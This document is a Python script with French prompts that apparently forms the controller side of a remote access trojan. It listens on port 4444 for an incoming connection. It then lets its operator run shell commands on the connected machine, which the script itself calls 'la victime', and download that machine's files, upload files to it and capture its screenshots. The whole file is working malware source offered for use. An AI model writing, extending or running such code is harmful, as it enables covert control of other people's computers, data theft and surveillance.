import socket
import os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
import random
h=""
p=4444
e="utf-8"
s.bind((h,p))
s.listen()
print("En écoute...")
conn,addr = s.accept()
print("Connecté à l'IP {} au port {}".format(addr[0],addr[1]))
while True:
    com = input("Entrez un commande: ").encode(e)
    conn.sendall(com)
    if com == b"shell":
        while True:
            cmd = input("cmd>>> ").encode(e).strip()
            conn.sendall(cmd)
            if cmd == b"exit":
                break
            
            if not cmd:
                continue
            
            data_size = conn.recv(16).decode("utf-8").strip()
        
            data_size = int(data_size)

            # Réception des données en boucle
            received_data = b""
            while len(received_data) < data_size:
                packet = conn.recv(4096)
                if not packet:
                    break
                received_data += packet

            print(received_data.decode("utf-8", errors='ignore'))

        
    if com==b"down":
        dem = input("Entrez le fichier que vous voulez: ").encode(e).strip()
        if not dem:
            continue
        conn.sendall(dem)
        size = int(conn.recv(1024).decode(e).strip())
        
        reg=input("Entrez le nom qui sera enregistré: ").strip()
        if not reg:
            continue
        
        with open(reg,"wb") as file:
            c=0
            while c < size:
                data = conn.recv(1024)
                file.write(data)
                c+=len(data)
    if com==b"upl":
        dem=input("Entrez le fichier a envoyer: ").encode(e).strip()
        if not dem:
            continue
        size= os.path.getsize(dem)
        conn.sendall(str(size).encode(e))
        reg = input("Entrez le nom du fichier qui sera enregistre sur la victime: ").encode(e).strip()
        if not reg:
            continue
        
        conn.sendall(reg)
        
        with open(dem,"rb") as file:
            c=0
            while c < size:
                data=file.read()
                conn.sendall(data)
                c+=len(data)
    if com == b"scr":
        t=random.randint(1111,9999)
        t=str(t)
        with open("{}.png".format(t),"wb") as file:
            c=0
            size= int(conn.recv(1024).decode(e))
            while c < size:
                data = conn.recv(1024)
                file.write(data)
                c+=(len(data))
                    


s.close()
conn.close()

        
